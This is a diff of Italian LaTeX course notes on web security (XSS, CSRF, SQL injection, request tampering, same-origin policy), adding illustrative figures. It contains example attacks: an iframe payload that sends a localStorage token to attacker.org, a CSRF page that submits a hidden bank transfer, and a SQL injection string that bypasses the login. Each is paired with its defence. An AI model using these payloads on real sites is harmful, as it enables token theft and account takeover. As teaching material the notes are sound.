@@ -85,11 +85,27 @@ reindirizzare la finestra (o un \code{iframe}) a una URL malevola, aggiungere
 un'immagine la cui sorgente è una URL malevola, caricare un foglio di stile con
 \attr{href} malevolo.
 
-\begin{lstlisting}[style=html]
+\begin{affianco}[0.52][c]
+\codicepiccolo
+\begin{lstlisting}[style=html, name=payload]
 <iframe src="javascript:window.location.href =
   `https://attacker.org?token=${localStorage.getItem('token')}`">
 </iframe>
 \end{lstlisting}
+\risultato
+\begin{immagine}[Il token esce dal browser come parametro\\
+                 di una normale richiesta.]
+\begin{tikzpicture}[
+    a/.style={-{Stealth[length=4pt,width=3.5pt]}, line width=0.75pt,
+      draw=neutral!45!black}]
+  \node[wtnodeplain, font=\Lato\scriptsize, text width=2.2cm] (v) at (0,0)
+    {browser della vittima\\[2pt]\FiraCodeNL token: eyJh\ldots};
+  \node[wtnodeplain, font=\FiraCodeNL\scriptsize, draw=merr, fill=red-gradient-1!30!white]
+    (m) at (5.7,0) {attacker.org};
+  \draw[a, draw=merr] (v) -- node[mcod, above]{GET /?token=eyJh\ldots} (m);
+\end{tikzpicture}
+\end{immagine}
+\end{affianco}
 \end{esempio}
 
 \subsection{Perché filtrare non basta}
@@ -124,11 +140,23 @@ Il modo corretto di affrontare il problema è \textbf{fare l'escaping}
 caratteri pericolosi (\code{<}, \code{>}, \code{"}, \code{'}) in innocue entità
 HTML --- esattamente quelle studiate nel capitolo 2.
 
-\begin{center}
+\begin{affianco}[0.5][c]
+\begin{center}\footnotesize
   \code{<script>alert("XSS")</script>} \\[3pt]
   $\downarrow$ \\[3pt]
   \code{\&lt;script\&gt;alert(\&quot;XSS\&quot;)\&lt;/script\&gt;}
 \end{center}
+\risultato
+\renewcommand{\wtdialogohost}{shop.example.com}
+\begin{browser}[senza escaping]
+  Risultati per: \par\vspace{4pt}
+  \wtdialogo{XSS}{\wtbottone[blue!70!black][white][blue!70!black]{OK}}
+\end{browser}
+\begin{browser}[con escaping]
+  Risultati per: {\ttfamily <script>alert("XSS")</script>}
+\end{browser}
+\wtnota{Codificato, il testo viene mostrato e non eseguito.}
+\end{affianco}
 
 Soluzioni dedicate esistono nella maggior parte dei framework e dei linguaggi, e
 si possono usare librerie apposite (per esempio \code{sanitize} per Node.js).
@@ -213,6 +241,8 @@ automaticamente il cookie di autenticazione}, come farebbe per qualunque altra
 richiesta verso quel dominio.
 
 \begin{esempio}{Una pagina di attacco}
+\begin{affianco}[0.52][c]
+\codicepiccolo
 \begin{lstlisting}[style=html, name=pagina-malevola.html]
 <!DOCTYPE html>
 <html lang="it">
@@ -235,6 +265,21 @@ richiesta verso quel dominio.
   </body>
 </html>
 \end{lstlisting}
+\risultato
+\begin{browser}[Pagina assolutamente non malevola!]
+  {\raggedright\Lora\bfseries\Large Ops, questo sito e' momentaneamente
+   non disponibile.\par}
+\end{browser}
+\begin{immagine}[Ciò che l'utente non vede: lo script invia il form.]
+\begin{tikzpicture}[
+    rq/.style={draw=neutral!50!black, fill=white, line width=0.7pt,
+      rounded corners=2pt, inner sep=4pt, align=left, font=\FiraCodeNL\scriptsize}]
+  \node[rq, draw=merr] (r) {POST https://bank.com/transfer\\
+    Cookie: auth=xYs\ldots\\[2pt]
+    to=EvilZampurian\&amount=999.99};
+\end{tikzpicture}
+\end{immagine}
+\end{affianco}
 
 Il form è invisibile (\code{display:none}) e viene inviato automaticamente da
 uno script: l'utente vede solo un messaggio di errore innocuo.
@@ -258,6 +303,7 @@ Un attaccante non può indovinare il token --- \textbf{a patto} che non esistano
 vulnerabilità XSS (che permetterebbero di leggerlo) e che i token non siano
 prevedibili.
 
+\begin{affianco}[0.48][c]
 \begin{lstlisting}[style=html, name=transfer.html]
 <form method="POST" action="/transfer">
   <input type="text"   name="to"     value="">
@@ -266,6 +312,25 @@ prevedibili.
   <input type="submit" value="submit">
 </form>
 \end{lstlisting}
+\risultato
+\begin{browser}[bank.com/transfer]
+  \wtcampo[2.6cm]{EvilFriend}\enspace\wtcampo[1.6cm]{100}\enspace\wtbottone{submit}
+\end{browser}
+\begin{immagine}[Il campo nascosto non si vede, ma viene inviato.]
+\begin{tikzpicture}[
+    a/.style={-{Stealth[length=4pt,width=3.5pt]}, line width=0.75pt,
+      draw=neutral!45!black},
+    rq/.style={draw=neutral!50!black, fill=white, line width=0.7pt,
+      rounded corners=2pt, inner sep=4pt, align=left, font=\FiraCodeNL\scriptsize}]
+  \node[wtnodeplain, font=\FiraCodeNL\scriptsize] (s) at (2.5,0)
+    {sessione: csrf = x5e1EUR};
+  \node[rq] (f) at (0,-1.6) {dal form\\csrf=x5e1EUR};
+  \node[rq, draw=merr] (m) at (5,-1.6) {dal sito malevolo\\(nessun csrf)};
+  \draw[a] (f.north) -- node[mnota, left=4pt]{uguali \mok} ([xshift=-0.6cm]s.south);
+  \draw[a, draw=merr] (m.north) -- node[mnota, above right=1pt]{diversi \merr} ([xshift=0.6cm]s.south);
+\end{tikzpicture}
+\end{immagine}
+\end{affianco}
 
 \info{Usare quello che il framework offre}{
   La maggior parte dei framework include già contromisure CSRF: per Express
@@ -316,12 +381,25 @@ Ma non possiamo fidarci dell'input dell'utente. Che cosa succede se
 l'attaccante inserisce come e-mail la stringa
 \code{luigi@webtech-sh.op'-{}-}?
 
+\begin{affianco}[0.46][c]
 \begin{lstlisting}[style=sql]
 SELECT * FROM Users
 WHERE email = 'luigi@webtech-sh.op'-- AND
   password = 'dontknowthislol' AND
   deletedAt IS NULL
 \end{lstlisting}
+\risultato
+\begin{immagine}[Il controllo sulla password è diventato un commento:\\
+                 la riga di \code{luigi} viene restituita.]
+\begin{tikzpicture}
+  \dbtabella{u}{(0,0)}{Users}{3}{id & email & password \\ \hline
+    1 & admin@webtech-sh.op & 0192023a\ldots \\
+    2 & \textcolor{merr}{luigi@webtech-sh.op} & 8f4e1cd7\ldots}
+  \draw[mrif, draw=merr, <-] ([xshift=3pt,yshift=0.42cm]u.south east) -- ++(0.6,0)
+    node[mnota, right, text=merr]{trovata};
+\end{tikzpicture}
+\end{immagine}
+\end{affianco}
 
 In SQL \code{-{}-} inizia un commento su riga singola: tutto il controllo sulla
 password sparisce, e l'attaccante entra come \code{luigi} senza conoscerne la
@@ -335,6 +413,8 @@ La difesa è usare \textbf{prepared statement con query parametriche} (o
 \textbf{separatamente} dal testo della query, quindi non possono in alcun modo
 alterarne la struttura.
 
+\begin{affianco}[0.5][c]
+\codicepiccolo
 \begin{lstlisting}[style=ts, name=login-sicura.ts]
 models.sequelize.query(`
   SELECT * FROM Users
@@ -350,6 +430,25 @@ models.sequelize.query(`
     next(err);
   });
 \end{lstlisting}
+\risultato
+\begin{immagine}[Il testo della query e i dati viaggiano separati:\\
+                 la stringa malevola resta un valore da confrontare.]
+\begin{tikzpicture}[
+    a/.style={-{Stealth[length=4pt,width=3.5pt]}, line width=0.75pt,
+      draw=neutral!45!black},
+    rq/.style={draw=neutral!50!black, fill=white, line width=0.7pt,
+      rounded corners=2pt, inner sep=4pt, align=left, font=\FiraCodeNL\scriptsize}]
+  \node[rq] (q) at (0,0.75) {WHERE email = \$1 AND password = \$2};
+  \node[mnota, anchor=south west] at (q.north west) {\textbf{query}};
+  \node[rq, text=accent!75!black] (p) at (0,-0.75) {\$1 = "luigi@webtech-sh.op'-{}-"};
+  \node[mnota, anchor=north west] at (p.south west) {\textbf{parametri}};
+  \node[draw=primary!65!black, fill=primary!8!white, shape=cylinder, shape border rotate=90,
+        aspect=0.25, minimum width=1.2cm, minimum height=1.2cm, font=\Lato\scriptsize]
+    (db) at (4.6,0) {DB};
+  \draw[a] (q.east) -- (db); \draw[a] (p.east) -- (db);
+\end{tikzpicture}
+\end{immagine}
+\end{affianco}
 
 \info{Un altro motivo per usare un ORM}{
   Usando i metodi di un ORM come Sequelize (\code{findOne}, \code{findAll} con
@@ -399,7 +498,8 @@ un punteggio da 1 a 5. Si riesce a inserire uno 0?
 Ispezionando le richieste di rete nei DevTools si vede che l'invio produce una
 \code{POST} a \code{/api/Feedbacks/} con questo corpo:
 
-\begin{lstlisting}[style=json]
+\begin{affianco}[0.46][c]
+\begin{lstlisting}[style=json, name=corpo della richiesta]
 {
   "UserId": 2,
   "captchaId": 1,
@@ -408,6 +508,21 @@ Ispezionando le richieste di rete nei DevTools si vede che l'invio produce una
   "rating": 3
 }
 \end{lstlisting}
+\risultato
+\begin{immagine}[Reinviata con \textit{Resend}: il server l'accetta.]
+\begin{tikzpicture}[
+    a/.style={-{Stealth[length=4pt,width=3.5pt]}, line width=0.75pt,
+      draw=neutral!45!black},
+    rq/.style={draw=neutral!50!black, fill=white, line width=0.7pt,
+      rounded corners=2pt, inner sep=4pt, align=left, font=\FiraCodeNL\scriptsize}]
+  \node[rq] (o) at (0,0) {POST /api/Feedbacks/\\\ldots\\"rating": 3};
+  \node[rq, draw=accent!60!black] (m) at (5.0,0)
+    {POST /api/Feedbacks/\\\ldots\\\textcolor{merr}{"rating": 0}};
+  \draw[a] (o) -- node[mnota, above]{modifica} (m);
+  \node[anchor=north] at ([yshift=-6pt]m.south) {\dtstato{201}\,{\Lato\scriptsize Created}};
+\end{tikzpicture}
+\end{immagine}
+\end{affianco}
 
 Basta rispedire la richiesta modificata con \code{"rating": 0}, cosa che si può
 fare direttamente dai DevTools con il comando \textit{Resend}. L'interfaccia
@@ -447,6 +562,7 @@ Consideriamo il documento all'indirizzo
 La politica si applica in generale a tutti i dati recuperati da codice
 JavaScript tramite \code{fetch()} o \code{XMLHttpRequest}.
 
+\begin{affianco}[0.46][c]
 \begin{lstlisting}[style=js, name=pagina su localhost:3001]
 function doFetch() {
   fetch("http://localhost:3000/").then(data => {
@@ -454,10 +570,16 @@ function doFetch() {
       console.log(data)
     })
   }).catch(err => {
-    console.log(err.message)   // bloccata dalla same-origin policy
+    console.log(err.message)  // richiesta bloccata
   });
 }
 \end{lstlisting}
+\risultato
+\begin{console}[Console]
+Richiesta multiorigine (cross-origin) bloccata: il criterio di corrispondenza dell'origine non consente la lettura della risorsa remota da http://localhost:3000/. Motivo: header CORS "Access-Control-Allow-Origin" mancante.
+NetworkError when attempting to fetch resource.
+\end{console}
+\end{affianco}
 
 \subsection{CORS}
 
